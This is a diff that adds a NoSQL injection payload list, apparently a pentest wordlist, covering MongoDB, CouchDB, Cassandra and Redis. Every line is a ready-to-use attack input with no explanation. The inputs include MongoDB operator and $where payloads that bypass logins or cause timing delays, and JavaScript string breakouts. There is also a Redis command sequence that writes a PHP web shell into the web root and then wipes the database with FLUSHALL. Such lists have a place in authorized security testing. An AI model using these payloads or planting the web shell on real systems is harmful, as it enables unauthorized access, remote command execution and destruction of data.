@@ -1,0 +1,61 @@
+# NoSQL injection — MongoDB, CouchDB, Cassandra, Redis
+
+# --- MongoDB auth bypass (JSON body) ---
+{"$ne": null}
+{"$ne": ""}
+{"$gt": ""}
+{"$gte": ""}
+{"$ne": 1}
+{"$regex": ".*"}
+{"$regex": "^admin"}
+{"$exists": true}
+{"$where": "1==1"}
+{"$where": "sleep(5000)"}
+{"$where": "this.password.length > 0"}
+{"$in": ["admin", "root"]}
+{"$or": [{"role": "admin"}]}
+
+# --- MongoDB string injection (when serialized into query) ---
+' || '1'=='1
+' || 1==1//
+' || true//
+'; return true; //
+";return(true);var x=";
+";return(db.users.find());var x=";
+
+# --- URL-encoded for GET params ---
+username[$ne]=
+username[$ne]=null
+username[$ne]=&password[$ne]=
+username[$regex]=^admin&password[$ne]=
+username[$gt]=&password[$gt]=
+username[$in][]=admin&password[$ne]=
+
+# --- CouchDB ---
+{"selector": {"_id": {"$gt": null}}}
+{"selector": {"$or": [{"role": "admin"}]}}
+
+# --- Cassandra CQL injection ---
+' ALLOW FILTERING;--
+' AND token(id) > token(0) ALLOW FILTERING--
+
+# --- Server-side template / reflected ---
+{{7*7}}
+{{constructor.constructor('alert(1)')()}}
+
+# --- Redis via SSRF / CRLF ---
+CONFIG SET dir /var/www/html
+CONFIG SET dbfilename shell.php
+SET x "<?php system($_GET['c']); ?>"
+BGSAVE
+FLUSHALL
+
+# --- MongoDB operator injection in JSON body (for login forms) ---
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": "admin", "password": {"$ne": null}}
+{"username": {"$regex": "^adm"}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+
+# --- Mongo script timing (blind) ---
+{"$where": "function(){sleep(5000);return true;}"}
+{"$where": "function(){var d=new Date();var end=d.getTime()+5000;while(new Date().getTime()<end);return true;}"}
